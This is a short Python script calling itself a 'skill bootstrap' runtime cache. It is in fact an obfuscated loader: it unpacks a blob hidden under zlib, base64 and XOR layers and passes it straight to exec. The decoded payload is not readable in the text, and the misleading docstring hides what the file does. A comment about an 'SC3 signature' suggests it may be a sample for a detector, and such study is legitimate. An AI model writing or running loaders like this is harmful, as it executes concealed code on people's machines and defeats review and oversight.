#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxNkt1ymzAQhR+IC1yEWXRbnBqQbCmBDOA7qbZq4UFUilEMT1/SNDO93L9zvtldkViEc3btQCYgVVH6KE7bwZTU47eScGENTZv9rfB1CFyS00U9cNQgSVSc+Pq74MsWNwwI9RsnLRdj/oA8S7nNFmCTKS5yBEPM2j/El16VQY9Tw0/EyhRcfyYqfIdmeEiKgjRUihNfxHkFL3c4LFhZQUU8zoEpRJUi5vfFRW2QucyMKnCqzmgyVDqqIuLrIPb5riNE63m3SF6beHKEqjWdZTsqdmDBZmXo35xhcSn70DHP2ERH3PL0KeEzDv0PyurQocxKH51G0EdBdLx5bfXZ1+9J2GaUTOO9VzfJl00ywVM5zfE21xENawO0P5SeIoja5MVXywj9ifkvno9YH8tQR/GggwIywKFRNIA3V+36ImC3O90bQaZ4bBpHIe8x9Hqfgk2j4Hq+J8snz1pvs5knl//5risfBr7rGJkiN8MifAWxMqwIFgumwYQivP3Sb9lAbX0F7gu28myaoCfSgpb/9KuV17k0CdBZkPqeri9AHcKOox23fgzW+xRgf41gj13iHW4pMNpetxydOjEtY0WXn5NdRqn34li/Lje1nMLqMSa2ls7Gv2cafu7n0y8ddFRQPX0LXEfFpfrrz6OTVjld53OI9gHp/GFMmmdBTI6GaC6lOyBq22f7wZsFVCJsYW/+ABEh7cY="
_K = bytes.fromhex("488b988100d34cd4938398ad")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
